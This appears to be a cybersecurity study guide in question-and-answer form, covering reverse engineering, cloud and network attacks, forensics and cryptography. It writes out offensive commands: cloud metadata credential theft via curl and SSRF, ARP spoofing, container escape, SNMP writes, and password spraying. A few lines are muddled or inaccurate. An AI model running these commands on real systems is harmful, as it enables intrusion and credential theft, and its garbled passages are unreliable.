Ghidra: NSA open-source reverse engineering framework; free alternative to IDA Pro; features decompiler (C-like pseudocode from assembly), disassembler, scripting (Java/Python), binary diffing, collaborative analysis. Setup: download from ghidra-sre.org; Java 11+ required; launch ghidraRun. Importing binary: File > Import File; auto-detects format (PE, ELF, Mach-O, raw); language/compiler detection (x86:LE:32:default:gcc, ARM:LE:32:v8, etc.); analyse with default analysers (auto-analysis finds strings, functions, imports). Navigation: Symbol Tree: browse functions, imports, exports, strings; CodeBrowser: disassembly and decompiler side-by-side; Decompiler window (Window > Decompiler); middle-click to follow references; G to go to address; F to find; L to rename label; right-click > References > Show References to find all callers. Decompiler: produces readable C-like pseudocode from binary; variable renaming (L key on variable); retype variables to correct types (right-click > Retype Variable); structures defined and applied improve readability significantly. Analysis workflow: start at entry point or main (main in exports or search for reference to __libc_start_main argument); identify interesting functions; rename (L) to meaningful names as you understand them; apply structure definitions from Windows headers; annotate with comments (;). Scripting: GhidraScript in Java or Python; headless mode for batch processing: analyzeHeadless projectDir projectName -import binary.exe -postScript MyScript.java. Useful scripts: ExportFunctionNames; Find crypto constants; StringDecryptorScript pattern. Comparison with IDA: IDA Pro vastly more expensive ($thousands/seat); IDA has better processor support, more plugin ecosystem; Ghidra decompiler quality comparable; Ghidra open-source allows extending; beginners often start with Ghidra due to cost.
What are common anti-debugging and anti-analysis techniques used by malware?

Anti-analysis techniques: (1) IsDebuggerPresent: Win32 API reads PEB.BeingDebugged flag; if non-zero, debugger attached; bypass: patch flag to 0 in memory. (2) CheckRemoteDebuggerPresent: calls NtQueryInformationProcess with ProcessDebugPort; returns non-zero if debugger attached; similar patch bypass. (3) Timing checks: RDTSC (read timestamp counter): call twice, if difference too large (debugger slow single-step), exit or alter behaviour; GetTickCount comparison; NtQuerySystemTime. (4) Parent process check: malware check parent is explorer.exe (normal launch); if parent is WinDbg or x64dbg (suspicious), exit. (5) Process/window enumeration: CheckRemoteDebuggerPresent; EnumProcesses looking for OllyDbg.exe, Wireshark.exe, ProcessHacker.exe; FindWindow looking for debugger window titles. (6) Heap flag checks: PEB.NtGlobalFlag = 0x70 when debugger present (heap validation flags enabled); direct PEB access: mov eax, fs:[0x30]; check offset 0x68 (32-bit) or 0xBC (64-bit). (7) INT3 / exception-based: set software breakpoints detected (int3 = 0xCC); check code for CC bytes; or set up exception handler -- if no exception (debugger consumed it), different code path. (8) VM detection: CPUID with EAX=0 returns vendor string (VMwareVMware, KVMKVMKVM, VBoxVBoxVBox); RDTSC difference (VM slower); specific registry keys (SOFTWARE\VMware, Inc.); MAC address OUI check (VMware: 00:0C:29, 00:50:56; VBox: 08:00:27); process list (vmtoolsd.exe, vboxservice.exe). (9) Sandbox detection: uptime < 5 minutes (sandbox fresh snapshot); no documents in My Documents; check for user activity (mouse movement history via GetLastInputInfo). (10) Code obfuscation: junk instructions (NOP, PUSH/POP pairs); opaque predicates (conditions always true or false but look complex); control flow flattening; VM protection (VMProtect, Themida): custom bytecode VM interprets original opcodes -- major reverse engineering obstacle.
How do you analyse a packed or obfuscated binary?

Packed binary analysis: packers (UPX, MPRESS, Themida, custom) compress/encrypt original code; small loader stub decompresses/decrypts to memory at runtime; original code never on disk in clear. Detection: PEiD or Detect-It-Easy (DIE) identifies packers by signature; high entropy sections (>7.0 bits/byte) in entropy viewer indicates encryption/compression; few imports (only LoadLibrary, GetProcAddress) indicates dynamic resolution. Manual unpacking: run in debugger; let loader stub execute; find OEP (Original Entry Point) -- various methods: (1) Hardware breakpoint on write to code section (OllyDbg/x64dbg: right-click on.text section memory region, set memory write BP; when execution writes unpacked code, break); (2) Find PUSHAD/POPAD pattern (common packer stub saves registers with PUSHAD at start, restores with POPAD before OEP); BP on POPAD then step to JMP OEP; (3) ESP trick: PUSHAD pushes all registers; set hardware breakpoint on [ESP] after PUSHAD; when POPAD executed, [ESP] accessed, break; OEP follows shortly. After reaching OEP: dump process memory to file (OllyDump plugin, PE Dump from x64dbg, Scylla); fix import table (Scylla ImpRec: scan for imports, identify IAT, fix dump); result: unpacked PE analysable in IDA/Ghidra. UPX specifically: upx -d packed.exe (if standard UPX); if customised UPX header bytes modified to prevent auto-unpack, do manually. Code obfuscation (OLLVM, Tigress): control flow flattening makes analysis hard; use symbolic execution (angr, Triton) to recover true control flow; concolic execution traces paths. VM protection (VMProtect, Themida): last resort -- very time-intensive; identify VM entry/exit bytecode interpretation loop; manually map bytecodes to original operations; usually only worth for high-value targets; specific deobfuscators exist for some VM products.
What is code signing and how can it be abused?

Code signing: process of attaching digital signature to executable to verify publisher identity and detect tampering; signature based on private key; verified using publisher certificate. Windows: Authenticode; certificate from CA (DigiCert, Comodo, Sectigo); sign with signtool.exe /a /f cert.pfx /p password binary.exe; Windows checks signature on execution; SmartScreen reputation based on certificate. Linux: GPG signatures for packages; Kernel Module Signing (kernel built with module signing support requires signed.ko files); Secure Boot verifies bootloader and kernel signatures. macOS: Gatekeeper checks app signature; notarization (Apple scans app for malware); spctl --assess binary checks status. Abuse techniques: (1) Stolen code signing certificates: attackers compromise certificate private keys of legitimate software companies; sign malware with legitimate certificate; high AV bypass rate; Stuxnet used stolen Realtek and JMicron certificates; common in APT campaigns. (2) Certificate theft: private key extraction from code signing HSMs (if poorly configured); from developer workstations; from build servers (supply chain). (3) Signing with cheap OV certificates: get legitimate Organisational Validation certificate ($100-$500); sign malware; SmartScreen won't flag signed unknown publisher less aggressively; some AV engines trust signed binaries more. (4) Self-signed certificates: sign with attacker-generated certificate; defeats tampering detection but not publisher verification; used for internal tools. (5) Binary patching after signing: modify resources or version info after signing; signature becomes invalid but some Windows API calls do not fully validate; timestamping complication. (6) Catalog-signed binaries: Windows catalog (security.cat) can sign individual files without embedding signature; WDAC policy allows catalog-signed files. Detection: check certificate chain for known malware; hunt for certificates revoked after abuse; VirusTotal checks certificate status.
How do you perform AWS security assessment?

AWS security assessment methodology: (1) IAM enumeration: aws iam get-account-authorization-details (list all users, groups, roles, policies -- requires IAM:List permissions but get-account-summary usable without full IAM access); aws iam list-users; aws iam list-roles; identify overprivileged roles. (2) S3 bucket enumeration: aws s3 ls (list all buckets in account); for each bucket: aws s3api get-bucket-acl --bucket BUCKET (check if public); aws s3api get-bucket-policy --bucket BUCKET; test unauthenticated access with unauthenticated AWS CLI or curl. (3) EC2 enumeration: aws ec2 describe-instances --query Reservations[*].Instances[*].[InstanceId,PublicIpAddress,Tags] (list instances and IPs); aws ec2 describe-security-groups (find open security groups: 0.0.0.0/0 on ports 22, 3389, sensitive ports). (4) Secrets scanning: aws secretsmanager list-secrets; aws ssm get-parameters-by-path --path / --recursive (SSM Parameter Store); environment variables in Lambda (aws lambda get-function-configuration --function-name NAME | grep -i secret). (5) Metadata service exploitation: from EC2 instance: curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ (list instance role); curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME (get temporary credentials); use credentials for lateral movement. SSRF to IMDS: if web application vulnerable to SSRF, fetch http://169.254.169.254/latest/meta-data/iam/security-credentials/; exfiltrate AWS credentials. IMDSv2 mitigation: requires session token (PUT to /latest/api/token first); SSRF-based IMDS attacks blocked if attacker cannot make PUT request. Tools: ScoutSuite (multi-cloud security auditing tool); Prowler (AWS CIS benchmark checks); CloudMapper (visualise AWS environment); Pacu (AWS exploitation framework); Principal Mapper (IAM privilege escalation paths).
What is the shared responsibility model in cloud security?

Shared responsibility model: cloud provider (AWS/Azure/GCP) and customer share security responsibilities; boundary varies by service type. Infrastructure as a Service (IaaS -- EC2, Azure VMs, GCP Compute): provider secures: physical datacentre, hardware, hypervisor, network infrastructure; customer secures: guest OS (patching), middleware, applications, data, IAM, network configuration (Security Groups/NSGs), encryption. Platform as a Service (PaaS -- RDS, Lambda, Azure App Service): provider additionally secures: OS, runtime, middleware; customer secures: application code, data, IAM configuration, application-level security settings. Software as a Service (SaaS -- Office 365, Salesforce, Google Workspace): provider secures nearly everything; customer secures: user access management, data configuration, proper use/sharing settings, MFA enforcement. Common customer mistakes in shared model: (1) Leaving S3 buckets public (customer responsibility to configure ACLs); (2) Not patching EC2 instance OS (customer responsibility); (3) Weak IAM policies (customer responsibility -- AWS IAM Analyzer helps); (4) Not encrypting data at rest (customer chooses encryption settings); (5) No MFA on AWS root account (customer responsibility). Security controls customer always owns: Identity and access management (who accesses what); data classification and protection; network security controls (Security Groups, WAF rules, NACLs); compliance and regulatory requirements; application security; logging and monitoring configuration (CloudTrail enabled in all regions). AWS Artifact: provides compliance documentation and reports; helps customers with audit requirements. AWS Well-Architected Framework Security Pillar: guidance for implementing shared responsibility effectively.
How do you exploit misconfigured Azure Active Directory?

Azure AD (now Entra ID) security assessment: (1) Tenant enumeration: validate tenant domain: https://login.microsoftonline.com/DOMAIN.com/.well-known/openid-configuration; user enumeration via login.microsoftonline.com (valid users return AADSTS50126 wrong password, invalid return AADSTS50034); AADInternals PowerShell module for comprehensive enumeration. (2) Password spray: avoid lockout -- one attempt per user per 30 min; MSOLSpray, Spray, TeamFiltration for Teams-specific spray; target admin accounts (globaladmin@domain.com, azureadmin@domain.com); avoid MFA-protected accounts. (3) OAuth phishing (device code flow): attacker initiates device code flow (POST to /devicecode); sends code to victim via phishing email; victim authenticates to microsoft.com and enters code; attacker polls /token endpoint; receives access tokens without seeing credentials or triggering MFA. (4) Token theft: steal access tokens from browser local storage; intercept token in Man-in-the-Middle; Evilginx/Modlishka (reverse proxy phishing) captures session cookies including post-MFA tokens. (5) Service principal and app registration abuse: list all app registrations (Get-AzureADApplication); find apps with overprivileged permissions; check for app secrets (client credentials) stored insecurely; guest users who have app registrations. (6) Conditional Access bypass: find gaps in CA policies (policies may not cover all apps; legacy authentication (SMTP, IMAP, POP) bypasses MFA CA policies); enable legacy auth in tenant to bypass MFA. (7) Azure AD Connect: if hybrid (on-prem AD + Azure AD); Azure AD Connect service account has DCSync rights on-prem; compromise Azure AD Connect server = DCSync on-prem AD. (8) PIM exploitation: if PIM (Privileged Identity Management) misonfigured; role activation without approval or MFA; check if activation policies enforced. Tools: ROADtools (Azure AD assessment); BloodHound with AzureHound (attack path analysis); MicroBurst (Azure security tools); o365creeper (user enumeration).
What security risks do Kubernetes clusters face?

Kubernetes security threats: (1) Exposed API server: default kube-apiserver may be internet-accessible; unauthenticated access allows full cluster control; Shodan finds exposed kubelets (port 10250) and API servers (6443); common in improperly configured cloud clusters. (2) Misconfigured RBAC: ClusterRoleBindings with ClusterAdmin to service accounts; verbs: [*] resources: [*]; wildcard permissions; poorly scoped roles; system:unauthenticated group with permissions. (3) Container escape: privileged container (securityContext: privileged: true) has access to host devices; mount host filesystem and escape; nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash (enter host namespace from privileged container); capabilies (SYS_ADMIN, SYS_PTRACE) allow namespace escapes. (4) Service account token abuse: default service account token mounted in every pod; token auto-mounts by default; attacker in any pod has API access with service account permissions; automountServiceAccountToken: false in pod spec unless needed. (5) Secrets in environment variables: Kubernetes secrets base64 encoded (not encrypted) by default in etcd; if etcd unencrypted or accessible: all secrets readable; secrets in pod env vars visible in kubectl describe pod. (6) Supply chain: malicious container images; compromised image registry; no image signing verification. (7) Lateral movement: compromise one pod; use service account token; access other namespaces; move to more privileged pods. Attack tools: kube-hunter (automated k8s security scanner); Peirates (k8s penetration tool); CDK (Container and K8s penetration toolkit); kube-bench (CIS benchmark checks). Defense: Network Policies (deny all ingress/egress, allow selectively); Pod Security Standards (Restricted); OPA Gatekeeper admission control; Falco runtime detection; encrypted etcd; image scanning and signing; mTLS between pods (Istio/Linkerd service mesh).
How does SSRF (Server-Side Request Forgery) work and how do you exploit it?

SSRF: attacker causes server to make HTTP requests to attacker-specified URLs; server acts as proxy; bypasses firewalls that protect internal resources. Basic SSRF: web application fetches URL from user input (curl $url, fetch(url), requests.get(url)); attacker sets url=http://internal-service/admin or url=http://169.254.169.254/latest/meta-data/iam/security-credentials/ (AWS metadata). Impact depends on what internal services exist: cloud metadata (AWS/GCP/Azure): get IAM credentials for privilege escalation; internal APIs without authentication; Redis/Memcached (no auth by default on internal network): Redis supports SSRF via Gopher protocol to execute arbitrary commands; internal admin panels; port scanning of internal network. SSRF bypass techniques for filters: (1) DNS rebinding: domain that resolves to public IP first (passes whitelist) then rebinds to 127.0.0.1 (actual request goes to localhost). (2) IP address obfuscation: 2130706433 (decimal for 127.0.0.1); 0x7f000001 (hex); 0177.0.0.1 (octal); 127.1 (short notation). (3) Redirect bypass: attacker-controlled server returns 302 redirect to internal address; server follows redirect. (4) URL parser inconsistencies: http://attacker.com@internal-host/ (some parsers use host after @); http://internal-host%00.attacker.com (null byte truncation). (5) Protocol bypass: file:// (read local files); gopher:// (send raw TCP data -- powerful for Redis/SMTP attacks); dict:// (port scanning). Blind SSRF: no response content visible; use out-of-band (Burp Collaborator, interactsh) -- server makes DNS/HTTP request to unique subdomain; confirms SSRF; upgrade to non-blind with redirect or timing. Defense: allowlist of permitted URLs/IPs; block 169.254.169.254 (metadata) and RFC1918 private ranges; use separate network for external fetches; IMDSv2 on AWS (mitigates IMDS SSRF).
What is cloud trail analysis and how do you detect threats in AWS?

CloudTrail: AWS service that logs API calls across AWS account; records: who made call (IAM user/role), what action (API name), when (timestamp), from where (source IP), on what resource (ARN), success/fail. Enabling: CloudTrail > Trails > Create trail; enable for all regions; enable S3 data events (bucket access) and Lambda data events; enable CloudWatch Logs integration; use S3 server-side encryption for trail storage. Key events to monitor: Authentication: ConsoleLogin (failed = brute force; unusual geography = credential theft); GetFederationToken (unusual role federation). IAM changes: CreateUser, AttachUserPolicy, CreateAccessKey, UpdateLoginProfile (password change), DeleteTrail (attacker covering tracks), StopLogging. Privilege escalation patterns: CreatePolicy + AttachUserPolicy; SetDefaultPolicyVersion to older permissive version; CreateRole + PassRole + AttachRolePolicy. Data access: GetObject (unusual volume on sensitive buckets); ListBuckets by unfamiliar user; GetSecretValue from Secrets Manager. Resource changes: AuthorizeSecurityGroupIngress (opening firewall rules); RunInstances (launching cryptominer EC2); CreateNetworkAclEntry. SIEM integration: CloudTrail to CloudWatch Logs to GuardDuty; or stream to S3, then S3 to Splunk/Elastic SIEM; Splunk TA for AWS parses CloudTrail. AWS GuardDuty: ML-based threat detection from CloudTrail, VPC Flow Logs, DNS logs; pre-built detectors: Trojan:EC2/DropPoint (known malware outbound), Recon:IAMUser/MaliciousIPCaller, UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration (IMDS credentials used from external IP), CryptoCurrency:EC2/BitcoinTool.B. CloudTrail Insights: anomaly detection on API call rates; detect unusual GetSecretValue volumes, CreateNetworkAcl spikes.
How do you attack SNMP (Simple Network Management Protocol)?

SNMP security assessment: protocol for network device management; SNMPv1/v2c use community strings (passwords) sent in cleartext; SNMPv3 adds authentication and encryption. Enumeration: nmap -sU -p 161 --script snmp-info target (UDP port 161); onesixtyone -c community_list.txt -i targets.txt (brute force community strings); common community strings: public, private, community, admin, cisco, default, manager. MIB walking: snmpwalk -v2c -c public target (walk entire OID tree with community string public); snmpget -v2c -c public target OID (get specific value). Information obtained: system description (OS, hardware); running processes (hrSWRunName OID); network interfaces and IPs; routing table; ARP table (IP-to-MAC mappings); installed software; user accounts on some devices; SNMP community strings of other devices (if device stores them). SNMP write (community string with write access): snmpset -v2c -c private target OID TYPE VALUE; write to system description; reload device (restart OID); modify routing tables on network gear; some Cisco devices writable SNMP allows full configuration modification. SNMPv3 attacks: if weak authentication (MD5 with weak passphrase): offline brute force captured SNMPv3 authentication frames; john with snmp2john format converter. CVE examples: Cisco IOS SNMP remote code execution vulnerabilities triggered by crafted OID values; NET-SNMP remote vulnerabilities; multiple CVEs in SNMP implementations allowing unauthenticated code execution with crafted packets. Defense: disable SNMPv1/v2c; use SNMPv3 level (authentication + encryption); use strong passphrases; restrict SNMP access to management VLAN; change community strings from defaults; firewall UDP 161/162 from internet.
Explain ARP spoofing and how to perform a man-in-the-middle attack.

ARP (Address Resolution Protocol): maps IP addresses to MAC addresses on local network; no authentication; any host can send gratuitous ARP responses claiming to be any IP. ARP spoofing (ARP poisoning): attacker sends fake ARP replies to victim and gateway; victim caches attacker MAC as gateway MAC; gateway caches attacker MAC as victim MAC; all traffic between victim and gateway passes through attacker -- MitM position. Tools: arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP (tell victim attacker is gateway); arpspoof -i eth0 -t GATEWAY_IP VICTIM_IP (tell gateway attacker is victim); enable IP forwarding: echo 1 > /proc/sys/net/ipv4/ip_forward (forward packets so victim connectivity maintained). Bettercap: bettercap -iface eth0; net.probe on; arp.spoof on; set arp.spoof.targets 192.168.1.5; more comprehensive; includes HTTP/HTTPS interception modules. Once in MitM position: Wireshark to capture all victim traffic; strip HTTPS (SSLstrip -- downgrade HTTPS to HTTP on redirect; victim sends credentials in clear); inject content into HTTP responses; modify downloaded executables. SSL/TLS interception (for HTTPS): requires victim to trust attacker CA certificate; corporate environments do this legitimately with deployed CA; attacker installs malicious CA via phishing + social engineering; rare in practice. Defense: Dynamic ARP Inspection (DAI) on managed switches -- validates ARP replies against DHCP snooping binding table; reject ARP replies with unexpected IP-to-MAC mapping; ARP inspection enabled on access switch ports; 802.1X port authentication; static ARP entries for gateways (impractical at scale); detection: ArpWatch monitors ARP table for changes and alerts on flips; IDS rules for excessive gratuitous ARP.
How do you attack and defend against DNS attacks?

DNS attack categories and defenses: (1) DNS cache poisoning (Kaminsky attack): attacker sends flood of forged DNS responses with random transaction IDs and source ports; if forged response arrives before legitimate one AND matches transaction ID and source port: caches malicious record; redirects victims to attacker server. Defense: DNSSEC (cryptographically validates responses); randomise source port (older resolvers used fixed port 53); use 0x20 encoding (randomise case in query and validate response matches). (2) DNS amplification DDoS: send DNS queries with spoofed source IP (victim's IP); DNS servers respond to victim with large amplification factor (ANY query returns large response -- 50x amplification); overwhelming victim bandwidth. Defense: response rate limiting (RRL) on authoritative servers; disable open recursors (only answer for clients in your network); configure DNS server to not respond to ANY queries. (3) DNS hijacking: compromise registrar account; change authoritative DNS servers; redirect all traffic; or compromise DNS resolver; or compromise router (change DNS server settings); BGP hijacking of DNS server IP. Defense: registrar 2FA; domain lock (transfer lock at registrar); registry lock (requires offline process to change); monitor NS records for changes. (4) DNS tunneling: encode data in DNS queries/responses; exfiltrate data bypassing DLP (DNS usually unrestricted); C2 communication via DNS; tools: dnscat2, iodine. Detection: high DNS query volume from endpoint; long subdomain labels; high-entropy domain names; DNS traffic to unusual external resolvers; non-standard DNS record types. (5) NXDomain flood: flood resolver with queries for non-existent domains; exhausts resolver resources; Negative TTL caching limits damage. (6) Zone transfer (AXFR): if misconfigured: dig AXFR @dns.target.com target.com exposes all DNS records; restrict AXFR to authorised secondary servers only.
What is 802.1X network access control and how can it be attacked?

802.1X: IEEE standard for port-based network access control; prevents unauthorised devices from connecting to LAN or WiFi; used in wired (Ethernet switches) and wireless (WPA2/WPA3 Enterprise). Components: Supplicant (client device seeking access); Authenticator (switch port or AP -- controls access); Authentication Server (RADIUS server -- validates credentials). EAP (Extensible Authentication Protocol) methods: PEAP/MSCHAPv2 (most common in enterprise WiFi): inner authentication is MSCHAPv2 (username/password); only server certificate validated by client; EAP-TLS (most secure): mutual certificate authentication; client presents user/machine certificate; no password -- requires PKI infrastructure; EAP-TTLS: tunnels other auth methods; similar to PEAP. 802.1X attacks: (1) Rogue AP (PEAP/MSCHAPv2): set up AP with same SSID, no server certificate validation required; client connects; presents MSCHAPv2 challenge; client responds with NTHash; attacker captures NTHash and cracks offline or uses in relay. Tool: hostapd-wpe (modified hostapd that captures credentials). (2) Certificate validation bypass: if supplicant configured to not validate server certificate (common misconfiguration -- especially Windows joined to domain); any certificate works; all credentials captured. (3) EAP-TLS attacks: weaker -- requires valid client certificate; certificate revocation bypass; stolen certificate with key. (4) MAB bypass (MAC Authentication Bypass): some 802.1X deployments fall back to MAC address authentication for devices without 802.1X supplicant (printers, IP cameras); spoof MAC of authorised device to bypass. Wired bypass: if 802.1X bypass mode: connect between authenticated device and port; observe and spoof authenticated device MAC; VLAN hopping through bypass device. Defense: enforce server certificate validation in supplicant profiles; use EAP-TLS instead of PEAP; certificate pinning; device compliance checks (NAC); quarantine VLAN for failed auth.
What is the forensic investigation process for a compromised Windows system?

Windows incident response and forensic investigation: Containment first: isolate host (disconnect network but preserve memory); do not reboot (volatile memory lost); image immediately. Volatile data collection (in order of volatility -- most volatile first): running processes (tasklist /v; Get-Process; Volatility pslist from memory dump); network connections (netstat -anob -- shows PID per connection; arp -a; route print); logged-on users (quser; net sessions); open files and handles (Process Hacker or handle.exe from Sysinternals); running services (sc query; Get-Service); scheduled tasks (schtasks /query /fo LIST /v). Memory acquisition: WinPmem, DumpIt, Magnet RAM Capture; write to external media; record SHA256 hash; full physical memory. Disk imaging: FTK Imager; write-block hardware; image to external drive or network share; SHA256 of image for chain of custody. Log collection: Windows Event Logs (Security, System, Application, PowerShell/Operational, Sysmon); export EVTX files; Windows XML EventLog format; LogParser or EvtxECmd for parsing. Analysis focus areas: Timeline: SuperTimeline (plaso/log2timeline) -- extract timestamps from all artefacts (file system, registry, event logs, prefetch, LNK files, browser history); create comprehensive timeline. Persistence: registry run keys; scheduled tasks; services; startup folder; WMI subscriptions; Office add-ins; browser extensions. Lateral movement: Event 4624 Type 3 (network logon); Event 4648 (explicit credential); Event 7045 (service install by remote admin tools); Event 4697 (service installed). Execution artefacts: Prefetch (C:\Windows\Prefetch\*.pf) -- last 8 execution times and files accessed; Shimcache (AppCompatCache registry -- application compatibility data; records execution path and timestamp); AmCache (C:\Windows\AppCompat\Programs\Amcache.hve -- SHA256 of executables); User Assist (recent program execution). Threat hunting: search IOCs (file hashes, IPs, domains) across timeline; compare against threat intelligence.
How do you perform memory forensics with Volatility?

Volatility: open-source memory forensics framework; analyse Windows, Linux, macOS memory images. Basic usage: vol.py -f memory.dmp --profile=Win10x64_19041 PLUGIN; Volatility 3 (vol3): vol.py -f memory.dmp windows.PLUGIN (auto-detects profile). Profile detection: vol3: automatic; vol2: vol.py -f memory.dmp imageinfo (suggests profiles). Key plugins: Process analysis: pslist (walk EPROCESS list -- can be hidden by unlinking); pstree (tree format with parent-child); psscan (scan memory for EPROCESS structures -- finds hidden processes that unlinked from list); dlllist -p PID (DLLs loaded by process); cmdline (command line args for each process -- reveals malicious command lines). Network: netscan (active and recently closed network connections with PIDs); connections (Windows XP/2003). Code injection detection: malfind (find injected code: MZ header in executable memory region; VAD with execute bit but no backing file on disk; dumps suspicious regions); dllscan vs dlllist discrepancy = injected DLL. Dump suspicious processes: procdump -p PID --dump-dir /output/ (dump process memory to file); memdump -p PID (full process address space). Registry: hivelist (loaded registry hives); printkey -K Software\Microsoft\Windows\CurrentVersion\Run (read registry key from memory). Password extraction: hashdump (SAM hashes if SYSTEM hive loaded); lsadump (LSA secrets); mimikatz (kerberos tickets, NTLM hashes from LSASS). Rootkit detection: ssdt (System Service Descriptor Table -- hook detection; modified entries point to non-ntoskrnl code = rootkit hook); modules vs modscan (hidden drivers); driverirp (IRP hook detection). Practical workflow: run psscan and compare with pslist (discrepancy = hidden process); run netscan (suspicious external connections); run malfind on suspicious PIDs; dump and analyse suspicious regions with IDA/Ghidra.
What are digital forensics chain of custody requirements?

Chain of custody: documented trail of who collected, handled, analysed, and transferred digital evidence; ensures evidence integrity and admissibility in legal proceedings. Why critical: without chain of custody, defence can argue evidence was tampered with or contaminated; evidence excluded from court; case dismissed. Documentation requirements: acquisition form: date, time, location of collection; name and badge/employee ID of collector; description of evidence (device type, make, model, serial number, physical condition); unique evidence item number assigned. Hash verification: immediately upon collection, compute MD5 and SHA256 of original media; document in chain of custody form; any subsequent copy must match hash; hash mismatch = evidence integrity compromised. Transfer records: each time evidence changes hands: from, to, date, time, reason for transfer; signature of both parties; maintained throughout investigation. Storage: sealed anti-static evidence bags (protect against static discharge and contamination); tamper-evident seals; secure evidence room with access log; environmental controls (temperature, humidity for long-term storage). Analysis documentation: all actions taken on evidence documented; tools used (name, version); commands executed; outputs and findings; changes made (any analysis that modifies evidence requires forensic copy -- work on copy, preserve original). Forensic copies: write-block all media before imaging; create bit-for-bit copy (Encase, FTK Imager, dd if=/dev/sda of=image.dd bs=512); verify hash of copy matches original; all analysis performed on copy. Court presentation: expert witness qualifications; methodology explained to judge/jury; chain of custody presented; opposing counsel can challenge any break in chain. International considerations: different jurisdictions have different rules (US Federal Rules of Evidence Rule 901 for authentication; EU eIDAS for electronic evidence; UK Police and Criminal Evidence Act); cross-border cases require understanding of each jurisdiction.
How do you investigate a phishing campaign after a successful compromise?

Post-phishing incident response: Identify scope: examine email logs (Exchange/O365: Get-MessageTrace; Google Workspace: Gmail log search); find all recipients of phishing email; determine who clicked link (URL filtering logs, proxy logs, browser history); who entered credentials (authentication logs -- O365 sign-in logs, AD event logs). Initial triage: pull affected accounts from email analysis; check sign-in activity for each: O365: Get-AzureADAuditSignInLogs | where UserPrincipalName -eq victim@domain.com (look for unfamiliar IPs, countries); suspicious successful logins after phishing timestamp. Credential compromise indicators: logins from new IP after phishing click; inbox rules created (auto-forward to external); password change (attacker changing password to maintain access); MFA method changes (attacker adds phone number); OAuth app consent (attacker creates persistent app with O365 permissions). Email compromise investigation: check inbox rules: Get-InboxRule -Mailbox victim@domain.com (forwarding rules, delete rules hiding attacker activity); check email delegates (SendAs, FullAccess); check OAuth apps with mail permissions; check sent items and deleted items (evidence of BEC activity -- attacker may have emailed clients/vendors requesting wire transfers or credential handover). Reset and remediate: force password reset; revoke all sessions (Revoke-AzureADUserAllRefreshToken or equivalent); remove malicious inbox rules; revoke malicious OAuth app permissions; check all accounts with same email server for similar rules (lateral spread via BEC). Threat hunt: phishing email indicators (sender domain, link domain, attachment hash) -- search across all employee mailboxes; expand scope if more victims found. Root cause: examine landing page (phishing kit); identify credential harvesting site; report to hosting provider and domain registrar for takedown; notify affected clients if BEC discovered emails to external parties.
Explain common cryptographic attack techniques.

Cryptographic attacks: (1) Brute force / exhaustive key search: try all possible keys; infeasible for modern key lengths (AES-128: 2^128 operations); feasible for short passwords (8-character alphanumeric: ~2^48 -- crackable with GPU in hours). (2) Dictionary attack: try words from wordlist against hash or encryption; rockyou.txt (14M passwords from 2009 breach); Hashcat with rules (append numbers, capitalise first letter, substitute l33t speak) dramatically extends coverage. (3) Rainbow table attack: precomputed hash-to-plaintext lookups for fast reversal; defeated by salting (unique random salt stored with hash; makes rainbow tables infeasible). (4) Birthday attack: find two inputs with same hash (collision) with probability ~50% after O(2^(n/2)) attempts (n = hash output bits); MD5 (128-bit): collisions in ~2^64 -- demonstrated; SHA-1 (160-bit): 2017 SHAttered attack found first collision; SHA-256 (256-bit): 2^128 -- currently safe. (5) Length extension attack: affects hash functions based on Merkle-Damgard construction (MD5, SHA-1, SHA-256 -- not SHA-256 truncated, not SHA-3, not BLAKE2); if MAC = H(secret || message), attacker can compute H(secret || message || padding || extension) without knowing secret; affects APIs using HMAC(key, message) = H(key || message) pattern; fix: use HMAC (H(key || H(key || message))) or SHA-3 or BLAKE2. (6) Padding oracle attack: CBC mode decryption with padding validation oracle (returns different error for invalid padding vs invalid MAC); attacker can decrypt any ciphertext block-by-block by sending modified ciphertexts and observing if padding error returned; POODLE (SSLv3 padding oracle); ASP.NET Padding Oracle (2010); fix: always check MAC before decryption (encrypt-then-MAC); constant-time comparison. (7) Timing attacks: measure time differences in operations to infer secret key bits; RSA exponentiation is branch-dependent; AES table lookups cause cache timing variations; constant-time implementations essential for crypto code.
What is the difference between symmetric and asymmetric encryption?

Symmetric encryption: same key used for encryption and decryption; fast; suitable for bulk data. Algorithms: AES (Advanced Encryption Standard): block cipher (128-bit blocks); key sizes 128, 192, or 256 bits; modes of operation matter critically: ECB (Electronic Code Book) -- same plaintext block = same ciphertext block = patterns visible -- NEVER USE for real data; CBC (Cipher Block Chaining) -- XOR each block with previous ciphertext -- IV required -- padding oracle attacks possible; CTR (Counter) -- turns block cipher into stream cipher -- generates keystream from counter + key -- no padding; GCM (Galois/Counter Mode) -- CTR + GHASH authentication tag -- AEAD (Authenticated Encryption with Associated Data) -- preferred. ChaCha20-Poly1305: stream cipher (ChaCha20) + MAC (Poly1305); AEAD; faster than AES on devices without AES-NI hardware instruction; used in TLS 1.3, WireGuard. Problem: key distribution -- how to securely share key? Asymmetric encryption: public/private key pair; public key shared freely; private key kept secret; what is encrypted with public key can only be decrypted with private key (and vice versa). Algorithms: RSA: based on difficulty of factoring large integers; 2048-bit minimum recommended (3072+ for long-term); slow (1000x slower than AES); used to encrypt symmetric keys or sign, not bulk data. ECC (Elliptic Curve Cryptography): based on elliptic curve discrete logarithm; smaller keys for equivalent security (256-bit ECC ≈ 3072-bit RSA); ECDH for key exchange; ECDSA for signing. Hybrid encryption: use RSA/ECDH to exchange symmetric key; use AES-GCM for bulk data; TLS, PGP, Signal protocol all use hybrid approach. Key exchange: Diffie-Hellman (DH): two parties exchange public values; each computes same shared secret without transmitting it; foundation of perfect forward secrecy; ECDH is elliptic curve variant -- preferred.
How does the Signal protocol provide end-to-end encrypted messaging?

